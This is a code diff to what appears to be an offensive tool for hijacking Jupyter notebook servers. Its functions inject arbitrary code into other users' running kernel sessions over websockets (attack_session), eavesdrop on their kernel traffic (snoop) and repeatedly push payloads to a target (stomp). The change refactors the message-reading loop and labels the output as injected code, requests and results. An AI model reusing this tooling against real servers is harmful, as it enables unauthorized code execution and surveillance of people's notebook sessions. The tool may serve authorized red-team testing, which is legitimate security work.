@@ -11,8 +11,25 @@ from websockets.sync import client
 import requests
 
 
+async def recv_all(connection, conn, timeout):
+    while True:
+        try:
+            async with asyncio.timeout(timeout):
+                msg = json.loads(await conn.recv())
+                if msg["msg_type"] in ["stream", "execute_reply", "execute_result"]:
+                    if msg["msg_type"] in ["stream", "execute_reply"]:
+                        text = msg["content"]["text"]
+                    elif msg["msg_type"] in ["execute_result"]:
+                        text = msg["content"]["data"]
+                    connection.print_with_rule(f"[bold blue]RESULT> {text}", category="[bold blue]RESULT")
+                elif msg["msg_type"] in ["execute_input"]:
+                    connection.print_with_rule(f"[bold red]REQUEST> {msg['content']['code']}", category="[bold red]REQUEST")
+        except:
+            break
+
+
 async def attack_session(
-    connection, session, code, silent=True, print_out=True, get_hist=False
+    connection, session, code, silent=True, print_out=True
 ):
     jpy_sess = connection.jpy_sessions[session]
     code_msg_id = str(uuid.uuid1())
@@ -24,21 +41,6 @@ async def attack_session(
         "parent_header": {},
     }
 
-    async def recv_all(conn):
-        while True:
-            try:
-                async with asyncio.timeout(1):
-                    msg = json.loads(await conn.recv())
-                    if get_hist and msg["msg_type"] == "stream":
-                        connection.print_with_rule(msg["content"]["text"])
-                    if "status" not in msg["msg_type"]:
-                        if print_out:
-                            connection.print_with_rule(
-                                f"  type: {msg['msg_type']:16} content: {msg['content']}"
-                            )
-            except:
-                break
-
     ws_base_url = urlparse(connection.url)._replace(scheme="ws").geturl()
     ws_url = (
         ws_base_url
@@ -47,11 +49,11 @@ async def attack_session(
     async with connect(
         ws_url, extra_headers=connection.headers, close_timeout=5
     ) as conn:
-        await recv_all(conn)
+        await recv_all(connection, conn, timeout=1)
         if print_out:
-            connection.print_with_rule(code_msg)
+            connection.print_with_rule(f"[bold red]INJECT> {code_msg['code']}", category="[bold red]CODE INJECTED")
         await conn.send(json.dumps(code_msg))
-        return await recv_all(conn)
+        return await recv_all(connection, conn, timeout=1)
 
 
 async def send_to_terminal(ws, code):
@@ -108,24 +110,12 @@ async def snoop(connection, session, timeout=60):
         + f'api/kernels/{jpy_sess['kernel']['id']}/channels?session_id={jpy_sess['id']}'
     )
 
-    async def recv_all(conn, timeout):
-        while True:
-            try:
-                async with asyncio.timeout(timeout):
-                    msg = json.loads(await conn.recv())
-                    if msg["msg_type"] == "stream":
-                        connection.print_with_rule(msg["content"]["text"])
-                    if "status" not in msg["msg_type"]:
-                        connection.print_with_rule(
-                            f"  type: {msg['msg_type']:16} content: {msg['content']}"
-                        )
-            except:
-                break
+    
 
     async with connect(
         ws_url, extra_headers=connection.headers, close_timeout=timeout
     ) as conn:
-        await recv_all(conn, timeout)
+        await recv_all(connection, conn, timeout)
 
 
 def stomp(connection, target, payload_str, frequency=60):
